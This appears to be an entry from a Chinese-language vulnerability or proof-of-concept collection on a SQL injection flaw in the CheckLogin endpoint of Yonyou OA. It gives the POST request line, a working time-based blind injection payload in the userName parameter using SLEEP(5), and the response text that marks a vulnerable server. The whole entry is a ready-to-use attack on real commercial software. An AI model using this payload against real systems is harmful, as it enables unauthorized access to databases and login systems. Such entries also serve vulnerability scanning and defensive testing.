# 用友OACheckLogin存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **请求**：`POST /yyoa/CheckLogin HTTP/1.1`

**Payload**
```
userName=11' AND (SELECT 6355 FROM (SELECT(SLEEP(5)))sHcE) AND 'wert'='wert&loginit12=&password=
```
- **响应特征**：-1 登录名错误